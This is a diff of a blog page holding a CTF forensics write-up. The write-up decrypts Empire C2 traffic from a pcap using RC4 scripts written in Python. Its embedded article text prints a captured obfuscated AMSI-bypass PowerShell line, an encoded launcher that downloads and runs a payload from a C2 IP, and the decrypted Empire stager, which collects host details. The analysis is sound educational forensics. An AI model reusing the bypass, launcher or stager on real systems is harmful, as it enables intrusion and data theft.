@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>Empire is at Risk - Writeup | Journal of Connar</title>
 <meta name="keywords" content="">
 <meta name="description" content="Intro
@@ -17,16 +17,16 @@ A lot of times hard difficulty challenges are related to C2 traffic, and in this
 Reference material to solve the challenge
 Navigating through some posts, a very good one that I used as a reference while solving the challenge was:">
 <meta name="author" content="connar">
-<link rel="canonical" href="http://localhost:1313/ctfwriteups/empirec2/">
+<link rel="canonical" href="https://connar.github.io/ctfwriteups/empirec2/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.1665878c578779cd11d4dc626b2c0e032a8b9c1dcf7d37f819200b4bc208b6a7.css" integrity="sha256-FmWHjFeHec0R1NxiaywOAyqLnB3PfTf4GSALS8IItqc=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://connar.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://connar.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://connar.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://connar.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://connar.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/ctfwriteups/empirec2/">
+<link rel="alternate" hreflang="en" href="https://connar.github.io/ctfwriteups/empirec2/">
 <noscript>
     <style>
         #theme-toggle,
@@ -63,7 +63,87 @@ Navigating through some posts, a very good one that I used as a reference while 
         }
 
     </style>
-</noscript>
+</noscript><meta property="og:title" content="Empire is at Risk - Writeup" />
+<meta property="og:description" content="Intro
+In this challenge we are given:
+
+    A pcap file (capture.pcap)
+    A powershell dump (powershell.DMP)
+
+A lot of times hard difficulty challenges are related to C2 traffic, and in this challenge we are given a pcap file that indicates there is a chance this might be the case. Simply searching for Empire C2 (Empire from the title of the challenge) will yield results related to an Empire C2 Framework.
+Reference material to solve the challenge
+Navigating through some posts, a very good one that I used as a reference while solving the challenge was:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://connar.github.io/ctfwriteups/empirec2/" /><meta property="article:section" content="ctfwriteups" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Empire is at Risk - Writeup"/>
+<meta name="twitter:description" content="Intro
+In this challenge we are given:
+
+    A pcap file (capture.pcap)
+    A powershell dump (powershell.DMP)
+
+A lot of times hard difficulty challenges are related to C2 traffic, and in this challenge we are given a pcap file that indicates there is a chance this might be the case. Simply searching for Empire C2 (Empire from the title of the challenge) will yield results related to an Empire C2 Framework.
+Reference material to solve the challenge
+Navigating through some posts, a very good one that I used as a reference while solving the challenge was:"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Ctfwriteups",
+      "item": "https://connar.github.io/ctfwriteups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Empire is at Risk - Writeup",
+      "item": "https://connar.github.io/ctfwriteups/empirec2/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Empire is at Risk - Writeup",
+  "name": "Empire is at Risk - Writeup",
+  "description": "Intro In this challenge we are given:\nA pcap file (capture.pcap)\nA powershell dump (powershell.DMP)\nA lot of times hard difficulty challenges are related to C2 traffic, and in this challenge we are given a pcap file that indicates there is a chance this might be the case. Simply searching for Empire C2 (Empire from the title of the challenge) will yield results related to an Empire C2 Framework.\nReference material to solve the challenge Navigating through some posts, a very good one that I used as a reference while solving the challenge was:\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "Intro In this challenge we are given:\nA pcap file (capture.pcap)\nA powershell dump (powershell.DMP)\nA lot of times hard difficulty challenges are related to C2 traffic, and in this challenge we are given a pcap file that indicates there is a chance this might be the case. Simply searching for Empire C2 (Empire from the title of the challenge) will yield results related to an Empire C2 Framework.\nReference material to solve the challenge Navigating through some posts, a very good one that I used as a reference while solving the challenge was:\nhttps://www.keysight.com/blogs/en/tech/nwvs/2021/06/16/empire-c2-networking-into-the-dark-side This post showcases how to decrypt traffic step by step and the similarities between this post and the challenge are plenty, which helped me a ton in the proccess of following it step by step. Quoted from the post:\nSTAGE 0 - First, the victim sends a GET beacon with a cookie in the HTTP headers, server replies with 200 OK with a big (~ 5.5 KB) encrypted payload.\rSTAGE 1 - The victim sends a POST message with an encrypted payload, to which server sends a 200 OK response with a small payload.\rSTAGE 2 - Finally, the victim sends another POST message, to which server replies with an even bigger (~ 41KB) payload. I will show how to proceed to each step and gather all the required info to decrypt the traffic.\nGetting the RC4 key Before we head to STAGE 0, we need to find the dropper. Navigating through the first TCP streams, we will end up finding the following packet:\nPS C:\\Windows\\system32\u003e whoami\rcorp\\satadministrator\rPS C:\\Windows\\system32\u003e $MFmONzmHg=$null;$rfsbs=\"$(('S'+'y'+'s'+'t'+'e'+'m').nORMALIZe([ChAR](70*52/52)+[CHAr](66+45)+[cHar]([byTe]0x72)+[chAr]([byte]0x6d)+[chAr](68*21/21)) -replace [CHaR](92*74/74)+[ChaR](112)+[chAR](123)+[cHaR](25+52)+[ChaR]([bYtE]0x6e)+[CHaR](18+107)).$([CHaR]([bYte]0x4d)+[chAr]([ByTe]0x61)+[cHAR]([ByTe]0x6e)+[cHaR](97)+[ChAr](103*89/89)+[CHar]([bytE]0x65)+[ChaR](17+92)+[cHaR]([BytE]0x65)+[char](51+59)+[cHaR](116+63-63)).$(('..ut..m'+'..t....n').noRMAlIZE([cHar](17+53)+[chAr](111+5-5)+[ChaR](114+20-20)+[ChAR](109)+[CHar]([BYTe]0x44)) -replace [chaR]([bYtE]0x5c)+[cHAr](28+84)+[CHAr](123*58/58)+[CHar](77)+[char](55+55)+[ChAr](125+34-34)).$([ChAR](30+35)+[char](109+82-82)+[chaR]([ByTE]0x73)+[ChAr]([BYte]0x69)+[char]([BYTE]0x55)+[cHar](116+28-28)+[cHar](105)+[chaR](108)+[Char]([Byte]0x73))\";$hn=\"+[cHAr]([ByTE]0x6d)+[cHaR]([BYtE]0x73)\";[Threading.Thread]::Sleep(1801);[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType($([chAr]([BYTE]0x53)+[chAR](121*1/1)+[CHAr]([byte]0x73)+[char]([bYtE]0x74)+[cHaR]([BytE]0x65)+[ChaR](109+98-98)+[cHAR](46*36/36)+[CHAR](82)+[cHar](61+40)+[ChAr](102*7/7)+[cHAR](108+8-8)+[CHaR]([bYte]0x65)+[char]([ByTE]0x63)+[cHAR]([ByTE]0x74)+[ChAr](105)+[cHAR]([byTe]0x6f)+[chAr]([bytE]0x6e)+[CHaR](46*5/5)+[cHar]([bYte]0x42)+[CHar](105+78-78)+[ChAr]([BytE]0x6e)+[chAR]([BYTe]0x64)+[CHAR](31+74)+[cHaR](22+88)+[chAr]([BytE]0x67)+[cHAR]([BYtE]0x46)+[cHaR](108*18/18)+[ChAR]([byte]0x61)+[cHar]([BYTe]0x67)+[ChAR]([BytE]0x73)))).FullName), $(('S'+'y'+'s'+'t'+'e'+'m').nORMALIZe([ChAR](70*52/52)+[CHAr](66+45)+[cHar]([byTe]0x72)+[chAr]([byte]0x6d)+[chAr](68*21/21)) -replace [CHaR](92*74/74)+[ChaR](112)+[chAR](123)+[cHaR](25+52)+[ChaR]([bYtE]0x6e)+[CHaR](18+107)).Reflection.FieldInfo]\" -as [String].Assembly.GetType($([CHAR]([BYtE]0x53)+[ChAr]([BYTE]0x79)+[cHAR]([BYte]0x73)+[ChAr]([BYTE]0x74)+[CHaR](101+5-5)+[ChaR]([BYTe]0x6d)+[ChAR](46)+[Char]([bYTe]0x54)+[Char]([byTe]0x79)+[chAR](12+100)+[char](101+27-27)))), [Object]([Ref].Assembly.GetType($rfsbs)),($(('GetF..'+'eld').NOrMaLize([chaR](70)+[char]([byTe]0x6f)+[CHAR]([bYtE]0x72)+[CHAr](109)+[CHar]([BYtE]0x44)) -replace [CHAr](92+15-15)+[ChAR]([bYTe]0x70)+[CHAR](123*12/12)+[chAr]([bYTE]0x4d)+[cHar]([bYTE]0x6e)+[ChaR](125+14-14)))).Invoke($([ChAr]([ByTE]0x61)+[CHAr]([BYTe]0x6d)+[chAr](101+14)+[ChaR]([bytE]0x69)+[CHaR]([BYte]0x49)+[char](110+17-17)+[CHaR](105)+[CHAR]([bytE]0x74)+[chAr]([byte]0x46)+[chaR]([byTE]0x61)+[Char]([BytE]0x69)+[chAr](108)+[chAr]([BYTe]0x65)+[chAr]([BYtE]0x64)),((\"NonPublic,Static\") -as [String].Assembly.GetType($([chAr]([BYTE]0x53)+[chAR](121*1/1)+[CHAr]([byte]0x73)+[char]([bYtE]0x74)+[cHaR]([BytE]0x65)+[ChaR](109+98-98)+[cHAR](46*36/36)+[CHAR](82)+[cHar](61+40)+[ChAr](102*7/7)+[cHAR](108+8-8)+[CHaR]([bYte]0x65)+[char]([ByTE]0x63)+[cHAR]([ByTE]0x74)+[ChAr](105)+[cHAR]([byTe]0x6f)+[chAr]([bytE]0x6e)+[CHaR](46*5/5)+[cHar]([bYte]0x42)+[CHar](105+78-78)+[ChAr]([BytE]0x6e)+[chAR]([BYTe]0x64)+[CHAR](31+74)+[cHaR](22+88)+[chAr]([BytE]0x67)+[cHAR]([BYtE]0x46)+[cHaR](108*18/18)+[ChAR]([byte]0x61)+[cHar]([BYTe]0x67)+[ChAR]([BytE]0x73))))).SetValue($MFmONzmHg,$True);\rPS C:\\Windows\\system32\u003e powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQAzAEEARABjAEEATABnAEEAMwBBAEQAUQBBAEwAZwBBAHgAQQBEAGsAQQBPAEEAQQB1AEEARABVAEEATQBnAEEANgBBAEQAZwBBAE0AQQBBADQAQQBEAE0AQQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAGUAdwB0AFYAWgBpAE4AfgA1ACkAMQAzAEMAeAAuAE0AQABvAE8ASgB5AHAAXgBHAD4AVABSAFcAcQAoACMAYgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAUgBZAGIAZgBIAEEAPQBQAG0ATABzAG0AYwBSAGUAKwBRAC8AZwB6AEwAUQBiAEoAbQBOAG8ANgBxAEIARgBlAFgAZwA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA Decoding the second b64 data that are going to be executed as powershell code, we get our dropper:\nIf ($PSVersionTable.PSVersion.Major - ge 3) {}; [System.Net.ServicePointManager]::Expect100Continue = 0; $wc = New - Object System.Net.WebClient; $u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'; $ser = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADMA'))); $t = '/news.php'; $wc.Headers.Add('User-Agent', $u); $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy; $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $Script:Proxy = $wc.Proxy; $K = [System.Text.Encoding]::ASCII.GetBytes('ewtVZiN~5)13Cx.M@oOJyp^G\u003eTRWq(#b'); $R = { $D, $K = $Args; $S = 0..255; 0..255|% { $J = ($J + $S[$_] + $K[$_%$K.Count])%256; $S[$_], $S[$J] = $S[$J], $S[$_] }; $D|% { $I = ($I + 1)%256; $H = ($H + $S[$I])%256; $S[$I], $S[$H] = $S[$H], $S[$I]; $_ - bxor$S[($S[$I] + $S[$H])%256] } }; $wc.Headers.Add(\"Cookie\", \"RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=\"); $data = $wc.DownloadData($ser + $t); $iv = $data[0..3]; $data = $data[4..$data.length]; - join[Char[]](\u0026 $R $data ($IV + $K))|IEX This basically downloads the STAGE 0 from the ip:port hidden inside this base64 blob: aAB0AHQAcAA6AC8ALwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADMA.\nThe RC4 key it uses is: ewtVZiN~5)13Cx.M@oOJyp^G\u003eTRWq(#b. It also sets a cookie encrypted with the same RC4 key: PmLsmcRe+Q/gzLQbJmNo6qBFeXg=. Before we proceed to decrypt our STAGE 0 payload, let’s try to decrypt the cookie as the blog suggests (to make sure we have the correct key and way of decryption). Based on the blog, I made the following python script:\nfrom Crypto.Cipher import ARC4 from base64 import b64decode key = b'ewtVZiN~5)13Cx.M@oOJyp^G\u003eTRWq(#b' enc_data = b'PmLsmcRe+Q/gzLQbJmNo6qBFeXg=' encr_data = b64decode(enc_data) cipher = ARC4.new(encr_data[0:4] + key) msg = cipher.decrypt(encr_data[4:19]) print(msg) Running it, we get:\n└─$ python rc4_decrypt.py b'00000000\\x01\\x01\\x00\\x00\\x00\\x00\\x00' which is the same as what the blog showcases, so we are in the right track! Basically, based on the blog:\n+-----------+--------+--------+---------+---------+\r| SessionID | Lang | Meta | Extra | Length |\r+-----------|--------|--------|---------|---------|\r| 8 bytes | 1 byte | 1 byte | 2 bytes | 4 bytes |\r+-----------|--------|--------|---------|-------- |\r| 00000000 | 01 | 01 | 0000 | 0000 |\r+-----------|--------|--------|---------|---------| Stage 0 Great, now let’s head to the response of the GET /news.php which contains the encrypted STAGE 0 code.\nGET /news.php HTTP/1.1\rCookie: RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=\rUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\rHost: 77.74.198.52:8083\rConnection: Keep-Alive\rHTTP/1.1 200 OK\rServer: Werkzeug/2.1.2 Python/3.9.13\rDate: Tue, 30 Aug 2022 16:35:50 GMT\rContent-Type: text/html; charset=utf-8\rContent-Length: 7409\rCache-Control: no-cache, no-store, must-revalidate\rPragma: no-cache\rExpires: 0\rServer: Microsoft-IIS/7.5\rConnection: close\r.).J\u003c...%o...o(]......J.......[\ry.O.^..6...........y.m...A...P.^J...bp:.\r... ...\r%...........f.7......=.O...H0;..0A.B.w.......N.r..[]l..b-.].W...........Y\u003e2Z......\r2..V....!.....CN\u0026ZF.e......[L\").\u0026.....m.....=.:....R.OKJx..=Y.....-.\rY...2.6cA.=....A...IC`.LUo..3.I\\........`......U.......p\r---more data--- We will modify our script to the following one for decryption:\nfrom Crypto.Cipher import ARC4 from base64 import b64decode key = b'ewtVZiN~5)13Cx.M@oOJyp^G\u003eTRWq(#b' # If we choose \"Show data as Raw\" in Wireshark, we will get the following hex data stored in enc_data enc_data = \"1a29d64a3cb4ebaf...[more hex]\" encr_data = bytes.fromhex(enc_data) cipher = ARC4.new(encr_data[0:4] + key) msg = cipher.decrypt(encr_data[4:]) print(msg) After running it, we get the decrypted STAGE 0 powershell code:\n$server = \"http://77.74.198.52:8083\"; $Script:ControlServers = @($server); $Script:ServerIndex = 0; if ($server.StartsWith(\\'https\\')) { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; } $Script:SendMessage = { param($Packets)if ($Packets) { $EncBytes = Encrypt - Bytes $Packets; $RoutingPacket = New - RoutingPacket - EncData $EncBytes - Meta 5; if ($Script:ControlServers[$Script:ServerIndex].StartsWith(\\'http\\')) { $wc = New - Object System.Net.WebClient; $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials; if ($Script:Proxy) { $wc.Proxy = $Script:Proxy; } $wc.Headers.Add(\\'User - Agent\\', $Script:UserAgent); $Script:Headers.GetEnumerator() | ForEach - Object { $wc.Headers.Add($_.Name, $_.Value) }; try { $taskURI = $Script:TaskURIs | Get - Random; $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, \\'POST\\', $RoutingPacket); } catch [System.Net.WebException] { if ($_.Exception.GetBaseException().Response.statuscode - eq 401) { Start - Negotiate - S \"$ser\" - SK $SK - UA $ua; } } } } }; $Script:GetTask = { try { if ($Script:ControlServers[$Script:ServerIndex].StartsWith(\"http\")) { $RoutingPacket = New - RoutingPacket - EncData $Null - Meta 4; $RoutingCookie = [Convert]::ToBase64String($RoutingPacket); $wc = New - Object System.Net.WebClient; $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials; if ($Script:Proxy) { $wc.Proxy = $Script:Proxy; } $wc.Headers.Add(\"User-Agent\", $script:UserAgent); $script:Headers.GetEnumerator() | % { $wc.Headers.Add($_.Name, $_.Value) }; $wc.Headers.Add(\"Cookie\", \"session=$RoutingCookie\"); $taskURI = $script:TaskURIs | Get - Random; $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI); $result; } } catch [Net.WebException] { $script:MissedCheckins += 1; if ($_.Exception.GetBaseException().Response.statuscode - eq 401) { Start - Negotiate - S \"$ser\" - SK $SK - UA $ua; } } }; function Start - Negotiate { param($s, $SK, $UA = \\'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\\', $hop)function ConvertTo - RC4ByteStream { Param ($RCK, $In)begin { [Byte[]] $Str = 0..255; $J = 0; 0..255 | ForEach - Object { $J = ($J + $Str[$_] + $RCK[$_ % $RCK.Length]) % 256; $Str[$_], $Str[$J] = $Str[$J], $Str[$_]; }; $I = $J = 0; } process { ForEach($Byte in $In) { $I = ($I + 1) % 256; $J = ($J + $Str[$I]) % 256; $Str[$I], $Str[$J] = $Str[$J], $Str[$I]; $Byte - bxor $Str[($Str[$I] + $Str[$J]) % 256]; } } } function Decrypt - Bytes { param ($Key, $In)if ($In.Length - gt 32) { $HMAC = New - Object System.Security.Cryptography.HMACSHA256; $e = [System.Text.Encoding]::ASCII; $Mac = $In[ - 10.. - 1]; $In = $In[0..($In.length - 11)]; $hmac.Key = $e.GetBytes($Key); $Expected = $hmac.ComputeHash($In)[0..9]; if (@(Compare - Object $Mac $Expected - Sync 0).Length - ne 0) { return; } $IV = $In[0..15]; try { $AES = New - Object System.Security.Cryptography.AesCryptoServiceProvider; } catch { $AES = New - Object System.Security.Cryptography.RijndaelManaged; } $AES.Mode = \"CBC\"; $AES.Key = $e.GetBytes($Key); $AES.IV = $IV; ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length - 16) } } $Null = [Reflection.Assembly]::LoadWithPartialName(\"System.Security\"); $Null = [Reflection.Assembly]::LoadWithPartialName(\"System.Core\"); $ErrorActionPreference = \"SilentlyContinue\"; $e = [System.Text.Encoding]::UTF8; $customHeaders = \"\"; $SKB = $e.GetBytes($SK); try { $AES = New - Object System.Security.Cryptography.AesCryptoServiceProvider; } catch { $AES = New - Object System.Security.Cryptography.RijndaelManaged; } $IV = [byte] 0..255 | Get - Random - count 16; $AES.Mode = \"CBC\"; $AES.Key = $SKB; $AES.IV = $IV; $hmac = New - Object System.Security.Cryptography.HMACSHA256; $hmac.Key = $SKB; $csp = New - Object System.Security.Cryptography.CspParameters; $csp.Flags = $csp.Flags - bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore; $rs = New - Object System.Security.Cryptography.RSACryptoServiceProvider - ArgumentList 2048, $csp; $rk = $rs.ToXmlString($False); $ID = - join(\"ABCDEFGHKLMNPRSTUVWXYZ123456789\".ToCharArray()|Get - Random - Count 8); $ib = $e.getbytes($rk); $eb = $IV + $AES.CreateEncryptor().TransformFinalBlock($ib, 0, $ib.Length); $eb = $eb + $hmac.ComputeHash($eb)[0..9]; if ( - not $wc) { $wc = New - Object System.Net.WebClient; $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials; } if ($Script:Proxy) { $wc.Proxy = $Script:Proxy; } if ($customHeaders - ne \"\") { $headers = $customHeaders - split \\', \\'; $headers | ForEach - Object { $headerKey = $_.split(\\':\\')[0]; $headerValue = $_.split(\\':\\')[1]; if ($headerKey - eq \"host\") { try { $ig = $WC.DownloadData($s) } catch {} }; $wc.Headers.Add($headerKey, $headerValue); } } $wc.Headers.Add(\"User-Agent\", $UA); $IV = [BitConverter]::GetBytes($(Get - Random)); $data = $e.getbytes($ID) + @(0x01, 0x02, 0x00, 0x00) + [BitConverter]::GetBytes($eb.Length); $rc4p = ConvertTo - RC4ByteStream - RCK $($IV + $SKB) - In $data; $rc4p = $IV + $rc4p + $eb; $raw = $wc.UploadData($s + \"/login/process.php\", \"POST\", $rc4p); $de = $e.GetString($rs.decrypt($raw, $false)); $nonce = $de[0..15] - join \\'\\'; $key = $de[16..$de.length] - join \\'\\'; $nonce = [String]([long]$nonce + 1); try { $AES = New - Object System.Security.Cryptography.AesCryptoServiceProvider; } catch { $AES = New - Object System.Security.Cryptography.RijndaelManaged; } $IV = [byte] 0..255 | Get - Random - Count 16; $AES.Mode = \"CBC\"; $AES.Key = $e.GetBytes($key); $AES.IV = $IV; $i = $nonce + \\'|\\' + $s + \\'|\\' + [Environment]::UserDomainName + \\'|\\' + [Environment]::UserName + \\'|\\' + [Environment]::MachineName; try { $p = (gwmi Win32_NetworkAdapterConfiguration|Where { $_.IPAddress } |Select - Expand IPAddress); } catch { $p = \"[FAILED]\" } $ip = @ { $true = $p[0]; $false = $p } [$p.Length - lt 6]; if (!$ip - or $ip.trim() - eq \\'\\') { $ip = \\'0.0.0.0\\' }; $i += \"|$ip\"; try { $i += \\'|\\' + (Get - WmiObject Win32_OperatingSystem).Name.split(\\'|\\')[0]; } catch { $i += \\'|\\' + \\'[FAILED]\\' } if (([Environment]::UserName).ToLower() - eq \"system\") { $i += \"|True\" } else { $i += \\'|\\' + ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\") } $n = [System.Diagnostics.Process]::GetCurrentProcess(); $i += \\'|\\' + $n.ProcessName + \\'|\\' + $n.Id; $i += \"|powershell|\" + $PSVersionTable.PSVersion.Major; $i += \"|\" + $env:PROCESSOR_ARCHITECTURE; $ib2 = $e.getbytes($i); $eb2 = $IV + $AES.CreateEncryptor().TransformFinalBlock($ib2, 0, $ib2.Length); $hmac.Key = $e.GetBytes($key); $eb2 = $eb2 + $hmac.ComputeHash($eb2)[0..9]; $IV2 = [BitConverter]::GetBytes($(Get - Random)); $data2 = $e.getbytes($ID) + @(0x01, 0x03, 0x00, 0x00) + [BitConverter]::GetBytes($eb2.Length); $rc4p2 = ConvertTo - RC4ByteStream - RCK $($IV2 + $SKB) - In $data2; $rc4p2 = $IV2 + $rc4p2 + $eb2; if ($customHeaders - ne \"\") { $headers = $customHeaders - split \\', \\'; $headers | ForEach - Object { $headerKey = $_.split(\\':\\')[0]; $headerValue = $_.split(\\':\\')[1]; if ($headerKey - eq \"host\") { try { $ig = $WC.DownloadData($s) } catch {} }; $wc.Headers.Add($headerKey, $headerValue); } } $wc.Headers.Add(\"User-Agent\", $UA); $wc.Headers.Add(\"Hop-Name\", $hop); $raw = $wc.UploadData($s + \"/admin/get.php\", \"POST\", $rc4p2); IEX $( $e.GetString($(Decrypt - Bytes - Key $key - In $raw)) ); $AES = $null; $s2 = $null; $wc = $null; $eb2 = $null; $raw = $null; $IV = $null; $wc = $null; $i = $null; $ib2 = $null; [GC]::Collect(); LRFT7 - Servers @(($s - split \"/\")[0..2] - join \"/\") - StagingKey $SK - SessionKey $key - SessionID $ID - WorkingHours \"\" - KillDate \"\" - ProxySettings $Script:Proxy; } Start - Negotiate - s \"$ser\" - SK \\'ewtVZiN~5)13Cx.M@oOJyp^G \u003e TRWq(#b\\' - UA $u - hop \"$hop\"; Stage 1 Continuing with the next pair of HTTP request-response, we are met with the following packet:\nPOST /login/process.php HTTP/1.1\rCookie: RYbfHA=PmLsmcRe+Q/gzLQbJmNo6qBFeXg=\rUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\rHost: 77.74.198.52:8083\rContent-Length: 462\r......",
+  "wordCount" : "3105",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":[{
+    "@type": "Person",
+    "name": "connar"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://connar.github.io/ctfwriteups/empirec2/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Journal of Connar",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://connar.github.io/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
